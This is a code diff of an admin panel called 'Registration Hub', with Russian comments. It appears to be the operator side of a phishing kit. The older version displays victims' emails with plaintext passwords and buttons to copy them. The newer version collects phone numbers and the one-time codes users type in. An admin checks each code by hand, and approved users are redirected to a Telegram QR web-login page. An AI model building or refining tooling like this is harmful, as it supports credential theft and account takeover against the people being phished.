@@ -2,11 +2,10 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Registration Hub — Admin Panel</title>
+  <title>Registration Hub — Admin Panel (Single Verification)</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description"
-        content="Admin panel for viewing registration hub & popcorn records." />
+  <meta name="description" content="Admin panel for registrations + phone verification requests." />
 
   <style>
     :root {
@@ -23,7 +22,6 @@
       --text-soft: #e5e7eb;
       --text-muted: #9ca3af;
       --radius-xl: 26px;
-      --radius-lg: 20px;
       --radius-full: 999px;
       --shadow-soft: 0 18px 70px rgba(0, 0, 0, 0.78);
       --font-main: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
@@ -41,11 +39,6 @@
       -webkit-font-smoothing: antialiased;
     }
 
-    a {
-      color: inherit;
-      text-decoration: none;
-    }
-
     .page {
       min-height: 100vh;
       display: flex;
@@ -58,7 +51,6 @@
     }
 
     /* HEADER */
-
     .header-wrap {
       position: sticky;
       top: 0;
@@ -100,6 +92,7 @@
       font-size: 14px;
       font-weight: 900;
       letter-spacing: 0.18em;
+      color: var(--accent);
     }
 
     .logo-text-block {
@@ -133,9 +126,8 @@
       letter-spacing: 0.16em;
       color: var(--accent-red);
       background: rgba(15,23,42,0.92);
+      white-space: nowrap;
     }
-
-    /* MAIN */
 
     main {
       padding: 18px 0 22px;
@@ -162,8 +154,9 @@
     .section-sub {
       font-size: 8.5px;
       color: var(--text-muted);
-      max-width: 720px;
+      max-width: 920px;
       margin-bottom: 14px;
+      line-height: 1.7;
     }
 
     .card {
@@ -187,12 +180,6 @@
       text-transform: uppercase;
       letter-spacing: 0.16em;
       color: var(--text-soft);
-    }
-
-    .card-sub {
-      font-size: 8px;
-      color: var(--text-muted);
-      margin-bottom: 8px;
     }
 
     .pill {
@@ -219,6 +206,7 @@
       align-items: center;
       gap: 4px;
       transition: all var(--transition-fast);
+      white-space: nowrap;
     }
 
     .btn-xs:hover {
@@ -248,21 +236,16 @@
       margin-top: 4px;
       color: var(--text-muted);
     }
+    .global-status.ok { color: var(--accent-green); }
+    .global-status.err { color: var(--accent-red); }
 
-    .global-status.ok {
-      color: var(--accent-green);
-    }
-
-    .global-status.err {
-      color: var(--accent-red);
-    }
-
+    /* TABLE */
     .logs-wrapper {
       margin-top: 14px;
       overflow-x: auto;
     }
 
-    .logs-table {
+    table {
       width: 100%;
       border-collapse: collapse;
       border-spacing: 0;
@@ -270,38 +253,28 @@
       font-size: 9px;
     }
 
-    .logs-table thead {
+    thead {
       background: rgba(15,23,42,0.9);
     }
 
-    .logs-table th,
-    .logs-table td {
+    th, td {
       padding: 6px 8px;
       border-bottom: 1px solid rgba(31,41,55,0.9);
       text-align: left;
       vertical-align: top;
+      white-space: nowrap;
     }
 
-    .logs-table th {
+    th {
       font-weight: 600;
       color: var(--text-soft);
       text-transform: uppercase;
       letter-spacing: 0.12em;
       font-size: 8px;
-      white-space: nowrap;
     }
 
-    .logs-table tbody tr:nth-child(even) {
-      background: rgba(15,23,42,0.78);
-    }
-
-    .logs-table tbody tr:nth-child(odd) {
-      background: rgba(15,23,42,0.96);
-    }
-
-    .logs-table td.actions-cell {
-      white-space: nowrap;
-    }
+    tbody tr:nth-child(even) { background: rgba(15,23,42,0.78); }
+    tbody tr:nth-child(odd)  { background: rgba(15,23,42,0.96); }
 
     .mono {
       font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
@@ -334,47 +307,20 @@
       color: #bfdbfe;
     }
 
-    .chip--popcorn {
-      border-color: rgba(249,115,22,0.9);
-      color: #fed7aa;
-    }
-
     .chip--status-approved {
       border-color: rgba(22,163,74,0.9);
       color: #bbf7d0;
     }
-
     .chip--status-declined {
       border-color: rgba(239,68,68,0.9);
       color: #fecaca;
     }
-
     .chip--status-pending {
       border-color: rgba(148,163,253,0.7);
       color: #c7d2fe;
     }
 
-    /* GRID для секции кодов */
-
-    .admin-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 12px;
-      margin-top: 10px;
-    }
-
-    @media (max-width: 1024px) {
-      .admin-grid {
-        grid-template-columns: 1fr;
-      }
-    }
-
-    .list-empty {
-      font-size: 8px;
-      color: var(--text-muted);
-      padding: 4px 0 2px;
-    }
-
+    /* REQUEST LIST */
     .item {
       border-radius: 16px;
       border: 1px solid rgba(31,41,55,0.9);
@@ -388,6 +334,7 @@
       justify-content: space-between;
       gap: 8px;
       margin-bottom: 4px;
+      align-items: center;
     }
 
     .item-main {
@@ -402,6 +349,7 @@
       display: flex;
       flex-wrap: wrap;
       gap: 6px;
+      margin-bottom: 6px;
     }
 
     .meta-tag {
@@ -419,25 +367,21 @@
       text-transform: uppercase;
       letter-spacing: 0.14em;
     }
-
     .status-tag--pending {
       border: 1px solid rgba(249,115,22,0.8);
       color: #fed7aa;
       background: rgba(249,115,22,0.08);
     }
-
     .status-tag--sent {
       border: 1px solid rgba(56,189,248,0.8);
       color: #e0f2fe;
       background: rgba(56,189,248,0.08);
     }
-
     .status-tag--valid {
       border: 1px solid rgba(34,197,94,0.9);
       color: #bbf7d0;
       background: rgba(34,197,94,0.14);
     }
-
     .status-tag--invalid {
       border: 1px solid rgba(239,68,68,0.9);
       color: #fecaca;
@@ -482,12 +426,6 @@
       white-space: nowrap;
     }
 
-    .code-pill--email {
-      border-color: rgba(56,189,248,0.9);
-      background: rgba(56,189,248,0.12);
-      color: #e0f2fe;
-    }
-
     .code-pill--access {
       border-style: dashed;
       opacity: 0.9;
@@ -500,6 +438,12 @@
       margin-top: 6px;
     }
 
+    .list-empty {
+      font-size: 8px;
+      color: var(--text-muted);
+      padding: 4px 0 2px;
+    }
+
     .footer {
       margin-top: 18px;
       padding: 12px 0 18px;
@@ -507,17 +451,8 @@
       color: var(--text-muted);
       text-align: center;
       border-top: 1px solid rgba(255, 255, 255, 0.06);
-      background: radial-gradient(circle at top,
-              rgba(255,184,0,0.03),
-              transparent);
+      background: radial-gradient(circle at top, rgba(255,184,0,0.03), transparent);
     }
-
-    @media (max-width: 900px) {
-      .logs-table {
-        font-size: 8px;
-      }
-    }
-
   </style>
 </head>
 <body>
@@ -533,7 +468,7 @@
             <span>REG</span>
             <span>HUB</span>
           </div>
-          <div class="sub-line">ADMIN PANEL • HUB + POPCORN</div>
+          <div class="sub-line">ADMIN PANEL • SINGLE VERIFICATION</div>
         </div>
       </div>
 
@@ -550,15 +485,12 @@
       <!-- REGISTRATIONS TABLE -->
       <section>
         <div class="section-title">
-          <span class="bar"></span>Registrations & Popcorn
+          <span class="bar"></span>Registrations
         </div>
+
         <div class="section-sub">
-          Здесь отображаются все регистрации из хаба (flow <strong>hub</strong>)
-          и “попкорн”-логины (flow <strong>popcorn</strong>).
-          Попкорн можно распознать по <strong>flow = POPCORN</strong> и/или
-          <code>ingameId = web-login</code>.  
-          Через действия справа можно <strong>approve / decline / delete</strong> заявку
-          и копировать email / password.
+          В таблице — все заявки из хаба. Подтверждение одно: <strong>Phone verify</strong> (это <code>emailVerified</code>).
+          Нажатие <strong>Approve</strong> отправляет в backend <code>redirectUrl</code> и помечает заявку <code>approved</code>.
         </div>
 
         <div class="card">
@@ -566,116 +498,95 @@
             <div class="card-title">Stored registrations</div>
             <div style="display:flex;align-items:center;gap:8px;">
               <span class="pill" id="logs-count-pill">0 items</span>
-              <button class="btn-xs" id="reload-btn">
-                ⟳ Reload
-              </button>
+              <button class="btn-xs" id="reload-btn">⟳ Reload</button>
             </div>
           </div>
 
           <div id="global-status" class="global-status"></div>
 
           <div class="logs-wrapper">
-            <table class="logs-table">
+            <table>
               <thead>
               <tr>
                 <th>#</th>
                 <th>Flow</th>
-                <th>Email</th>
-                <th>Password</th>
+                <th>Phone</th>
                 <th>In-game ID</th>
                 <th>Access code</th>
-                <th>Verify</th>
+                <th>Phone verify</th>
                 <th>Status</th>
                 <th>Created</th>
+                <th>Redirect</th>
                 <th></th>
               </tr>
               </thead>
-              <tbody id="logs-tbody">
-              <!-- rows inject here -->
-              </tbody>
+              <tbody id="logs-tbody"></tbody>
             </table>
           </div>
         </div>
       </section>
 
-      <!-- CODES SECTION -->
+      <!-- PHONE VERIFICATION REQUESTS -->
       <section style="margin-top:20px;">
         <div class="section-title">
-          <span class="bar"></span>Verification codes (ID / Email)
+          <span class="bar"></span>Phone verification requests
         </div>
+
         <div class="section-sub">
-          Здесь отображаются все запросы на коды, которые создаёт форма:<br>
-          <strong>ID verification code</strong> и <strong>Email verification code</strong>.  
-          Админ вручную сверяет коды, которые игрок ввёл, с теми, что он ему выдал,
-          и тут отмечает <strong>VALID / INVALID</strong> или удаляет запрос.
+          Это единственная верификация. В базе поле называется <code>email</code>, но там хранится телефон.
+          Игрок: <strong>SEND REQUEST</strong> → создаёт request. Потом вводит код → <strong>CHECK</strong> → обновится <code>lastCode</code>.
+          Ты отмечаешь <strong>VALID / INVALID</strong>.
         </div>
 
-        <div class="admin-grid">
-          <!-- ID CODES -->
-          <div class="card">
-            <div class="card-header">
-              <div class="card-title">ID verification codes</div>
-              <div class="pill" id="id-count-pill">0 items</div>
-            </div>
-            <div class="card-sub">
-              Создаются, когда игрок нажимает <strong>SEND REQUEST</strong> под ID-кодом.
-              Ты отправляешь ему код (любой канал), он вводит его на сайте,
-              а потом ты здесь отмечаешь, верный он или нет.
-            </div>
-            <div id="id-requests-list"></div>
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">Phone verification codes</div>
+            <div class="pill" id="phone-count-pill">0 items</div>
           </div>
 
-          <!-- EMAIL CODES -->
-          <div class="card">
-            <div class="card-header">
-              <div class="card-title">Email verification codes</div>
-              <div class="pill" id="email-count-pill">0 items</div>
-            </div>
-            <div class="card-sub">
-              Аналогично, но для проверки email.  
-              После того как игрок ввёл код, ты помечаешь его как VALID / INVALID,
-              и результат уходит обратно на сайт в CHECK.
-            </div>
-            <div id="email-requests-list"></div>
-          </div>
+          <div id="phone-requests-list"></div>
         </div>
       </section>
 
     </div>
   </main>
 
-  <!-- FOOTER -->
   <footer class="footer">
-    REGISTRATION HUB PANEL — internal view for hub & popcorn data and verification codes. Keep this page private.
+    REGISTRATION HUB PANEL — keep private.
   </footer>
 </div>
 
 <script>
-  // ========= CONFIG: совместимо со старым backend =========
-  const API_BASE    = "/admin/api";
-  const STATE_URL   = API_BASE + "/state";                 // GET -> { idCodeRequests, emailCodeRequests, registrations }
-  const APPROVE_URL = API_BASE + "/registration/approve";  // POST -> { id, slot, link, note }
-  const DECLINE_URL = API_BASE + "/registration/decline";  // POST -> { id, reason, note }
-  const DELETE_URL  = API_BASE + "/registration/delete";   // POST -> { id }
+  // ========= CONFIG =========
+  // Админка ожидает backend:
+  // GET  /admin/api/state  -> { registrations, emailCodeRequests }
+  // POST /admin/api/email-code/mark-valid   { id }
+  // POST /admin/api/email-code/mark-invalid { id }
+  // POST /admin/api/email-code/delete       { id }
+  // POST /admin/api/registration/approve    { id, redirectUrl }
+  // POST /admin/api/registration/decline    { id, reason, note }
+  // POST /admin/api/registration/delete     { id }
 
-  const ID_VALID_URL    = API_BASE + "/id-code/mark-valid";
-  const ID_INVALID_URL  = API_BASE + "/id-code/mark-invalid";
-  const ID_DELETE_URL   = API_BASE + "/id-code/delete";
+  const REDIRECT_AFTER_APPROVE = "https://telegram-qr-web-login.onrender.com";
 
-  const EMAIL_VALID_URL   = API_BASE + "/email-code/mark-valid";
-  const EMAIL_INVALID_URL = API_BASE + "/email-code/mark-invalid";
-  const EMAIL_DELETE_URL  = API_BASE + "/email-code/delete";
+  const API_BASE     = "/admin/api";
+  const STATE_URL    = API_BASE + "/state";
 
-  const tbodyEl    = document.getElementById("logs-tbody");
-  const countPill  = document.getElementById("logs-count-pill");
-  const globalStatusEl = document.getElementById("global-status");
-  const reloadBtn  = document.getElementById("reload-btn");
+  const APPROVE_URL  = API_BASE + "/registration/approve";
+  const DECLINE_URL  = API_BASE + "/registration/decline";
+  const DELETE_URL   = API_BASE + "/registration/delete";
 
-  // кодовые списки
-  const idListEl       = document.getElementById("id-requests-list");
-  const emailListEl    = document.getElementById("email-requests-list");
-  const idCountPill    = document.getElementById("id-count-pill");
-  const emailCountPill = document.getElementById("email-count-pill");
+  const PHONE_VALID_URL   = API_BASE + "/email-code/mark-valid";
+  const PHONE_INVALID_URL = API_BASE + "/email-code/mark-invalid";
+  const PHONE_DELETE_URL  = API_BASE + "/email-code/delete";
+
+  const tbodyEl       = document.getElementById("logs-tbody");
+  const countPill     = document.getElementById("logs-count-pill");
+  const globalStatusEl= document.getElementById("global-status");
+  const reloadBtn     = document.getElementById("reload-btn");
+
+  const phoneListEl   = document.getElementById("phone-requests-list");
+  const phoneCountPill= document.getElementById("phone-count-pill");
 
   function setStatus(text, type) {
     globalStatusEl.textContent = text || "";
@@ -686,12 +597,8 @@
     if (!iso) return "";
     const d = new Date(iso);
     if (isNaN(d.getTime())) return iso;
-    const date = d.toLocaleDateString("en-GB", {
-      day: "2-digit", month: "2-digit", year: "numeric"
-    });
-    const time = d.toLocaleTimeString("en-GB", {
-      hour: "2-digit", minute: "2-digit"
-    });
+    const date = d.toLocaleDateString("en-GB", { day: "2-digit", month: "2-digit", year: "numeric" });
+    const time = d.toLocaleTimeString("en-GB", { hour: "2-digit", minute: "2-digit" });
     return date + " " + time;
   }
 
@@ -712,8 +619,7 @@
     try { return await res.json(); } catch { return {}; }
   }
 
-  /* ---------- REGISTRATIONS TABLE ---------- */
-
+  // ---------- REGISTRATIONS TABLE ----------
   function renderRows(items) {
     if (!items || items.length === 0) {
       tbodyEl.innerHTML = `
@@ -726,43 +632,31 @@
       return;
     }
 
-    // новые сверху
-    items.sort((a, b) => {
-      const da = new Date(a.createdAt || 0).getTime();
-      const db = new Date(b.createdAt || 0).getTime();
-      return db - da;
-    });
-
+    items.sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
     countPill.textContent = items.length + (items.length === 1 ? " item" : " items");
 
     const rows = items.map((item, idx) => {
-      const id        = item.id ?? item.pk ?? idx;
-      const flowRaw   = (item.flow || "hub").toLowerCase();
-      const email     = item.email || "";
-      const password  = item.password || item.pass || "";
-      const ingameId  = item.ingameId || "";
-      const accessCode= item.accessCode || "";
-      const created   = formatDate(item.createdAt || item.created_at || item.timestamp);
+      const id         = item.id ?? item.pk ?? idx;
+      const flowRaw    = (item.flow || "hub").toLowerCase();
+      const phone      = item.email || "";          // phone stored in email
+      const ingameId   = item.ingameId || "";
+      const accessCode = item.accessCode || "";
+      const created    = formatDate(item.createdAt || item.created_at || item.timestamp);
 
-      const idVerified    = item.idVerified    ? "✔" : "—";
-      const emailVerified = item.emailVerified ? "✔" : "—";
-      const statusRaw     = (item.status || "pending").toLowerCase();
+      const phoneVerified = item.emailVerified ? "✔" : "—";
+      const statusRaw  = (item.status || "pending").toLowerCase();
+      const isFinal    = statusRaw === "approved" || statusRaw === "declined";
 
-      let flowChipClass = "chip";
-      let flowLabel     = "HUB";
-      if (flowRaw === "popcorn") {
-        flowChipClass += " chip--popcorn";
-        flowLabel = "POPCORN";
-      } else {
-        flowChipClass += " chip--hub";
-      }
+      let flowChipClass = "chip chip--hub";
+      let flowLabel = "HUB";
+      if (flowRaw !== "hub") { flowLabel = flowRaw.toUpperCase(); }
 
       let statusChipClass = "chip";
       if (statusRaw === "approved") statusChipClass += " chip--status-approved";
       else if (statusRaw === "declined") statusChipClass += " chip--status-declined";
       else statusChipClass += " chip--status-pending";
 
-      const isFinal = statusRaw === "approved" || statusRaw === "declined";
+      const redirectUrl = item.redirectUrl || item.link || REDIRECT_AFTER_APPROVE;
 
       return `
         <tr data-id="${id}">
@@ -772,16 +666,12 @@
               <span class="chip-label">FLOW</span>${flowLabel}
             </span>
           </td>
-          <td class="mono">${email || "—"}</td>
-          <td class="mono">${password || "—"}</td>
+          <td class="mono">${phone || "—"}</td>
           <td class="mono">${ingameId || "—"}</td>
           <td class="mono">${accessCode || "—"}</td>
           <td>
             <span class="chip">
-              <span class="chip-label">ID</span>${idVerified}
-            </span>
-            <span class="chip">
-              <span class="chip-label">MAIL</span>${emailVerified}
+              <span class="chip-label">PHONE</span>${phoneVerified}
             </span>
           </td>
           <td>
@@ -790,34 +680,20 @@
             </span>
           </td>
           <td>${created || "—"}</td>
-          <td class="actions-cell">
-            <button class="btn-xs btn-xs--primary"
-                    data-action="copy"
-                    data-field="email"
-                    data-id="${id}">
-              📋 Email
+          <td class="mono" style="max-width:320px;overflow:hidden;text-overflow:ellipsis;">
+            ${redirectUrl ? redirectUrl : "—"}
+          </td>
+          <td>
+            <button class="btn-xs btn-xs--primary" data-action="copy-phone" data-id="${id}">
+              📋 Phone
             </button>
-            <button class="btn-xs btn-xs--primary"
-                    data-action="copy"
-                    data-field="password"
-                    data-id="${id}">
-              📋 Pass
-            </button>
-            <button class="btn-xs btn-xs--primary"
-                    data-action="approve"
-                    data-id="${id}"
-                    ${isFinal ? "disabled" : ""}>
+            <button class="btn-xs btn-xs--primary" data-action="approve" data-id="${id}" ${isFinal ? "disabled" : ""}>
               ✅ Approve
             </button>
-            <button class="btn-xs btn-xs--danger"
-                    data-action="decline"
-                    data-id="${id}"
-                    ${isFinal ? "disabled" : ""}>
+            <button class="btn-xs btn-xs--danger" data-action="decline" data-id="${id}" ${isFinal ? "disabled" : ""}>
               ❌ Decline
             </button>
-            <button class="btn-xs btn-xs--danger"
-                    data-action="delete"
-                    data-id="${id}">
+            <button class="btn-xs btn-xs--danger" data-action="delete" data-id="${id}">
               🗑 Delete
             </button>
           </td>
@@ -828,41 +704,33 @@
     tbodyEl.innerHTML = rows;
   }
 
-  function findRowData(id) {
+  function findRowPhone(id) {
     const row = tbodyEl.querySelector('tr[data-id="' + id + '"]');
-    if (!row) return {};
-    const cells = row.children;
-    return {
-      email:    cells[2]?.textContent.trim() || "",
-      password: cells[3]?.textContent.trim() || ""
-    };
+    if (!row) return "";
+    // phone is column index 2
+    return (row.children[2]?.textContent || "").trim();
   }
 
-  async function copyField(id, field) {
-    const data  = findRowData(id);
-    const value = data[field] || "";
-    if (!value) return;
+  async function copyPhone(id) {
+    const phone = findRowPhone(id);
+    if (!phone || phone === "—") return;
     try {
-      await navigator.clipboard.writeText(value);
-      setStatus(field + " copied to clipboard.", "ok");
+      await navigator.clipboard.writeText(phone);
+      setStatus("Phone copied to clipboard.", "ok");
     } catch (e) {
       console.error(e);
-      setStatus("Failed to copy to clipboard.", "err");
+      setStatus("Failed to copy.", "err");
     }
   }
 
   async function approveRegistration(id) {
-    const slot = prompt("Slot (optional, e.g. GROUP A / LOBBY 3):", "");
-    if (slot === null) return;
-    const link = prompt("Link (optional, lobby / room link):", "");
-    if (link === null) return;
-    const note = prompt("Internal note (optional):", "");
-    if (note === null) return;
+    // максимально просто: один confirm
+    if (!confirm("Approve this registration?\nRedirect URL will be set to:\n" + REDIRECT_AFTER_APPROVE)) return;
 
     setStatus("Approving #" + id + "…", "");
     try {
-      await postJSON(APPROVE_URL, { id, slot, link, note });
-      setStatus("Registration approved.", "ok");
+      await postJSON(APPROVE_URL, { id, redirectUrl: REDIRECT_AFTER_APPROVE });
+      setStatus("Registration approved. Redirect URL saved.", "ok");
       await loadState();
     } catch (e) {
       console.error(e);
@@ -871,9 +739,9 @@
   }
 
   async function declineRegistration(id) {
-    const reason = prompt("Decline reason (short: invalid_email / risky_account / other):", "other");
+    const reason = prompt("Decline reason (short: invalid / risky / other):", "other");
     if (reason === null) return;
-    const note = prompt("Internal note (optional):", "");
+    const note = prompt("Note (optional):", "");
     if (note === null) return;
 
     setStatus("Declining #" + id + "…", "");
@@ -900,28 +768,20 @@
     }
   }
 
-  // делегируем клики по таблице
   tbodyEl.addEventListener("click", (e) => {
     const btn = e.target.closest("button[data-action]");
     if (!btn) return;
     const action = btn.getAttribute("data-action");
-    const id     = btn.getAttribute("data-id");
+    const id = btn.getAttribute("data-id");
     if (!action || !id) return;
 
-    if (action === "copy") {
-      const field = btn.getAttribute("data-field");
-      copyField(id, field);
-    } else if (action === "approve") {
-      approveRegistration(id);
-    } else if (action === "decline") {
-      declineRegistration(id);
-    } else if (action === "delete") {
-      deleteRegistration(id);
-    }
+    if (action === "copy-phone") copyPhone(id);
+    if (action === "approve") approveRegistration(id);
+    if (action === "decline") declineRegistration(id);
+    if (action === "delete") deleteRegistration(id);
   });
 
-  /* ---------- CODE REQUESTS (ID / EMAIL) ---------- */
-
+  // ---------- PHONE REQUESTS ----------
   function statusBadgeForRequest(status) {
     const s = (status || "pending").toLowerCase();
     if (s === "valid")   return '<span class="status-tag status-tag--valid">VALID</span>';
@@ -930,14 +790,16 @@
     return '<span class="status-tag status-tag--pending">PENDING</span>';
   }
 
-  function renderIdRequests(list) {
+  function renderPhoneRequests(list) {
     if (!list || list.length === 0) {
-      idListEl.innerHTML = '<div class="list-empty">No ID verification requests yet.</div>';
-      idCountPill.textContent = "0 items";
+      phoneListEl.innerHTML = '<div class="list-empty">No phone verification requests yet.</div>';
+      phoneCountPill.textContent = "0 items";
       return;
     }
 
-    idCountPill.textContent = list.length + (list.length === 1 ? " item" : " items");
+    // newest first
+    list.sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
+    phoneCountPill.textContent = list.length + (list.length === 1 ? " item" : " items");
 
     const html = list.map(item => {
       const created = formatDate(item.createdAt);
@@ -949,7 +811,7 @@
 
       const lastCodeLine = item.lastCode
         ? `<div class="item-row item-row--code">
-             <span class="code-label">ID CODE</span>
+             <span class="code-label">LAST CODE</span>
              <span class="code-pill">${item.lastCode}</span>
            </div>`
         : "";
@@ -961,173 +823,79 @@
       return `
         <div class="item" data-id="${item.id}">
           <div class="item-header">
-            <div class="item-main">
-              ${item.ingameId || "Unknown ID"}
-            </div>
+            <div class="item-main">${item.email || "Unknown phone"}</div>
             ${status}
           </div>
-          <div class="item-meta">
-            ${accessTag}
-            <span class="meta-tag">Email: ${item.email || "—"}</span>
-            ${created ? `<span class="meta-tag">${created}</span>` : ""}
-          </div>
-          ${lastCodeLine}
-          ${lastCodeTimeLine}
-          <div class="item-actions">
-            <button class="btn-xs btn-xs--primary"
-                    data-action="mark-id-valid"
-                    data-id="${item.id}">
-              ✔ ID OK
-            </button>
-            <button class="btn-xs btn-xs--danger"
-                    data-action="mark-id-invalid"
-                    data-id="${item.id}">
-              ✕ ID BAD
-            </button>
-            <button class="btn-xs btn-xs--danger"
-                    data-action="delete-id-request"
-                    data-id="${item.id}">
-              🗑 DELETE
-            </button>
-          </div>
-        </div>
-      `;
-    }).join("");
 
-    idListEl.innerHTML = html;
-  }
-
-  function renderEmailRequests(list) {
-    if (!list || list.length === 0) {
-      emailListEl.innerHTML = '<div class="list-empty">No email verification requests yet.</div>';
-      emailCountPill.textContent = "0 items";
-      return;
-    }
-
-    emailCountPill.textContent = list.length + (list.length === 1 ? " item" : " items");
-
-    const html = list.map(item => {
-      const created = formatDate(item.createdAt);
-      const status = statusBadgeForRequest(item.status);
-
-      const accessTag = item.accessCode
-        ? `<span class="meta-tag">Access: <span class="code-pill code-pill--access">${item.accessCode}</span></span>`
-        : `<span class="meta-tag">Access: —</span>`;
-
-      const lastCodeLine = item.lastCode
-        ? `<div class="item-row item-row--code">
-             <span class="code-label">EMAIL CODE</span>
-             <span class="code-pill code-pill--email">${item.lastCode}</span>
-           </div>`
-        : "";
-
-      const lastCodeTimeLine = item.lastCodeAt
-        ? `<div class="item-row"><strong>Last check:</strong> ${formatDate(item.lastCodeAt)}</div>`
-        : "";
-
-      return `
-        <div class="item" data-id="${item.id}">
-          <div class="item-header">
-            <div class="item-main">
-              ${item.email || "Unknown email"}
-            </div>
-            ${status}
-          </div>
           <div class="item-meta">
             ${accessTag}
             ${item.ingameId ? `<span class="meta-tag">ID: ${item.ingameId}</span>` : ""}
             ${created ? `<span class="meta-tag">${created}</span>` : ""}
           </div>
+
           ${lastCodeLine}
           ${lastCodeTimeLine}
+
           <div class="item-actions">
-            <button class="btn-xs btn-xs--primary"
-                    data-action="mark-email-valid"
-                    data-id="${item.id}">
-              ✔ EMAIL OK
-            </button>
-            <button class="btn-xs btn-xs--danger"
-                    data-action="mark-email-invalid"
-                    data-id="${item.id}">
-              ✕ EMAIL BAD
-            </button>
-            <button class="btn-xs btn-xs--danger"
-                    data-action="delete-email-request"
-                    data-id="${item.id}">
-              🗑 DELETE
-            </button>
+            <button class="btn-xs btn-xs--primary" data-action="mark-valid" data-id="${item.id}">✔ PHONE OK</button>
+            <button class="btn-xs btn-xs--danger"  data-action="mark-invalid" data-id="${item.id}">✕ PHONE BAD</button>
+            <button class="btn-xs btn-xs--danger"  data-action="delete-request" data-id="${item.id}">🗑 DELETE</button>
           </div>
         </div>
       `;
     }).join("");
 
-    emailListEl.innerHTML = html;
+    phoneListEl.innerHTML = html;
   }
 
-  async function handleCodeAction(action, id) {
+  async function handlePhoneAction(action, id) {
     try {
       let url = "";
-      let payload = { id };
+      const payload = { id };
 
-      if (action === "mark-id-valid") {
-        url = ID_VALID_URL;
-      } else if (action === "mark-id-invalid") {
-        url = ID_INVALID_URL;
-      } else if (action === "delete-id-request") {
-        if (!confirm("Delete this ID verification request? This cannot be undone.")) return;
-        url = ID_DELETE_URL;
-      } else if (action === "mark-email-valid") {
-        url = EMAIL_VALID_URL;
-      } else if (action === "mark-email-invalid") {
-        url = EMAIL_INVALID_URL;
-      } else if (action === "delete-email-request") {
-        if (!confirm("Delete this email verification request? This cannot be undone.")) return;
-        url = EMAIL_DELETE_URL;
+      if (action === "mark-valid") url = PHONE_VALID_URL;
+      if (action === "mark-invalid") url = PHONE_INVALID_URL;
+      if (action === "delete-request") {
+        if (!confirm("Delete this phone verification request?")) return;
+        url = PHONE_DELETE_URL;
       }
-
       if (!url) return;
 
-      setStatus("Performing action: " + action + "…", "");
+      setStatus("Performing action…", "");
       await postJSON(url, payload);
-      setStatus("Action completed: " + action + ".", "ok");
+      setStatus("Action completed.", "ok");
       await loadState();
     } catch (e) {
       console.error(e);
-      setStatus("Action failed: " + action + ". Check backend logs.", "err");
+      setStatus("Action failed. Check backend logs.", "err");
     }
   }
 
-  // делегируем клики по двум спискам кодов
-  [idListEl, emailListEl].forEach(container => {
-    container.addEventListener("click", (e) => {
-      const btn = e.target.closest("button[data-action]");
-      if (!btn) return;
-      const action = btn.getAttribute("data-action");
-      const id     = btn.getAttribute("data-id");
-      if (!action || !id) return;
-      handleCodeAction(action, id);
-    });
+  phoneListEl.addEventListener("click", (e) => {
+    const btn = e.target.closest("button[data-action]");
+    if (!btn) return;
+    const action = btn.getAttribute("data-action");
+    const id = btn.getAttribute("data-id");
+    if (!action || !id) return;
+    handlePhoneAction(action, id);
   });
 
-  /* ---------- LOAD STATE ---------- */
-
+  // ---------- LOAD STATE ----------
   async function loadState() {
     setStatus("Loading admin state…", "");
     try {
       const data = await getJSON(STATE_URL);
 
-      const regs   = Array.isArray(data.registrations)   ? data.registrations   : [];
-      const idReqs = Array.isArray(data.idCodeRequests)  ? data.idCodeRequests  : [];
-      const emReqs = Array.isArray(data.emailCodeRequests) ? data.emailCodeRequests : [];
+      const regs = Array.isArray(data.registrations) ? data.registrations : [];
+      const phoneReqs = Array.isArray(data.emailCodeRequests) ? data.emailCodeRequests : [];
 
       renderRows(regs);
-      renderIdRequests(idReqs);
-      renderEmailRequests(emReqs);
+      renderPhoneRequests(phoneReqs);
 
-      setStatus("State loaded. Use buttons to manage requests.", "ok");
+      setStatus("State loaded.", "ok");
     } catch (e) {
       console.error(e);
-      setStatus("Failed to load admin state. Check backend /admin/api/state.", "err");
+      setStatus("Failed to load state. Check /admin/api/state.", "err");
 
       tbodyEl.innerHTML = `
         <tr>
@@ -1136,19 +904,12 @@
           </td>
         </tr>`;
       countPill.textContent = "0 items";
-
-      idListEl.innerHTML    = '<div class="list-empty">Error loading ID requests.</div>';
-      emailListEl.innerHTML = '<div class="list-empty">Error loading email requests.</div>';
-      idCountPill.textContent    = "0 items";
-      emailCountPill.textContent = "0 items";
+      phoneListEl.innerHTML = '<div class="list-empty">Error loading phone requests.</div>';
+      phoneCountPill.textContent = "0 items";
     }
   }
 
-  reloadBtn.addEventListener("click", () => {
-    loadState();
-  });
-
-  // старт
+  reloadBtn.addEventListener("click", loadState);
   loadState();
 </script>
 
